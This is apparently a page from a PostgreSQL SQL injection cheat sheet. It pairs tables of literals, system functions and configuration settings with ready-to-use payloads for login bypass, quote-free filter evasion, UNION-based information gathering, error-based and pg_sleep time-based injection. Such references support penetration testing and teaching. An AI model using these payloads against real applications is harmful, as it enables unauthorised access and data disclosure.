---
title: Constants
description: PostgreSQL constants and literals useful in SQL injection
category: Reference
order: 22
tags: ["constants", "literals", "reference"]
lastUpdated: 2025-12-14
---

## Constants

PostgreSQL supports various types of constants (literals) that can be valuable in SQL injection attacks. Understanding these constants helps in crafting more effective payloads and bypassing certain filters.

### Numeric Constants

PostgreSQL supports several formats for numeric literals:

| Type                | Example      | Notes                               |
| ------------------- | ------------ | ----------------------------------- |
| Integer             | `1234`       | Regular integer                     |
| Negative Integer    | `-123`       | Negative value                      |
| Decimal             | `123.45`     | Decimal point notation              |
| Scientific Notation | `1.23e2`     | Same as 123.0                       |
| Hexadecimal         | `0xFF`       | Same as 255 (numeric context)       |
| Binary              | `B'1111'`    | Bit string literal (15)             |
| Boolean             | `true/false` | Boolean literals (case-insensitive) |

### String Constants

String literals can be represented in several ways:

| Type           | Example          | Notes                                |
| -------------- | ---------------- | ------------------------------------ |
| Single Quote   | `'text'`         | Standard SQL string                  |
| Dollar Quote   | `$$text$$`       | PostgreSQL-specific, avoids escaping |
| Tagged Dollar  | `$tag$text$tag$` | Custom tag for nested strings        |
| Escape String  | `E'text\n'`      | Allows C-style escape sequences      |
| Unicode String | `U&'\0041'`      | Unicode escape (letter A)            |
| Hex Bytea      | `'\x48454C4C4F'` | Bytea hex format                     |

### Dollar-Quoted Strings

Dollar quoting is unique to PostgreSQL and extremely useful for injection:

```sql
-- Standard dollar quote
SELECT $$admin$$;

-- Tagged dollar quote (useful for nesting)
SELECT $x$admin$x$;

-- Nested example
SELECT $outer$This contains $$inner$$ quotes$outer$;
```

### Temporal Constants

Date and time constants:

| Type      | Example                 | Notes                      |
| --------- | ----------------------- | -------------------------- |
| Date      | `'2025-03-15'`          | YYYY-MM-DD format          |
| Time      | `'15:30:45'`            | HH:MM:SS format            |
| Timestamp | `'2025-03-15 15:30:45'` | YYYY-MM-DD HH:MM:SS format |
| Interval  | `INTERVAL '1 day'`      | Time interval              |

### Special Constants

PostgreSQL has several special values:

| Constant            | Description                          |
| ------------------- | ------------------------------------ |
| `NULL`              | Represents a NULL value              |
| `DEFAULT`           | Used to specify default column value |
| `CURRENT_TIMESTAMP` | Current date and time                |
| `CURRENT_DATE`      | Current date                         |
| `CURRENT_TIME`      | Current time                         |
| `LOCALTIME`         | Current time without timezone        |
| `LOCALTIMESTAMP`    | Current timestamp without timezone   |

### System Information Functions

PostgreSQL uses functions rather than `@@` variables for system info:

| Function                     | Description           | Example Value         |
| ---------------------------- | --------------------- | --------------------- |
| `version()`                  | PostgreSQL version    | `PostgreSQL 15.4...`  |
| `current_database()`         | Current database name | `mydb`                |
| `current_schema()`           | Current schema        | `public`              |
| `current_user`               | Current username      | `postgres`            |
| `session_user`               | Session username      | `postgres`            |
| `inet_server_addr()`         | Server IP address     | `192.168.1.100`       |
| `inet_server_port()`         | Server port           | `5432`                |
| `pg_postmaster_start_time()` | Server start time     | `2025-01-01 00:00:00` |

### Configuration Settings

Access configuration via `current_setting()`:

```sql
SELECT current_setting('data_directory');    -- /var/lib/postgresql/data
SELECT current_setting('log_directory');     -- pg_log
SELECT current_setting('config_file');       -- /etc/postgresql/.../postgresql.conf
SELECT current_setting('hba_file');          -- /etc/postgresql/.../pg_hba.conf
SELECT current_setting('server_version');    -- 15.4
SELECT current_setting('port');              -- 5432
```

### Boolean Expressions

Boolean expressions evaluate to true or false:

| Expression         | Result |
| ------------------ | ------ |
| `1=1`              | true   |
| `1=0`              | false  |
| `NULL IS NULL`     | true   |
| `NULL IS NOT NULL` | false  |
| `true AND true`    | true   |
| `true OR false`    | true   |

### Using Constants in SQL Injection

#### Dollar Quote Bypasses

```sql
-- Avoid single quotes entirely
' OR username=$$admin$$ --

-- Using tagged dollar quotes
' UNION SELECT $x$injected$x$, 2 --
```

#### Numeric Constants in Bypasses

```sql
-- Boolean as condition
' OR true --

-- Mathematical expression
' OR 4-3=1 --

-- Using numeric operators
' OR 1::boolean --
```

#### String Encoding Bypasses

```sql
-- Using CHR() to avoid quotes
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);  -- 'admin'

-- Using escape strings
SELECT E'\x61\x64\x6d\x69\x6e';  -- 'admin'

-- Using convert_from with bytea
SELECT convert_from('\x61646d696e', 'UTF8');  -- 'admin'
```

#### Practical Applications

##### Using Boolean Constants

```sql
-- Simple authentication bypass
' OR true --
' OR 1=1 --
' OR NOT false --
```

##### Using System Functions

```sql
-- Information gathering
' UNION SELECT version(), current_database() --

-- Path disclosure
' UNION SELECT current_setting('data_directory'), 2 --
```

### Error-Based Injection with Constants

```sql
-- Using type casting to reveal data
' AND 1=CAST(version() AS int) --

-- Using :: shorthand
' AND version()::int=1 --
```

### Constants in Time-Based Attacks

```sql
-- Sleep based on condition
' AND CASE WHEN SUBSTRING(version(),1,10)='PostgreSQL' THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Using boolean condition
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

### Limitations and Considerations

1. Dollar-quoted strings are PostgreSQL-specific and won't work in other databases
2. PostgreSQL is stricter about type casting than MySQL
3. Boolean `true`/`false` are actual types, not just aliases for 1/0
4. Some system functions require specific privileges to access
5. Escape string syntax (`E'...'`) must be enabled (default in modern versions)
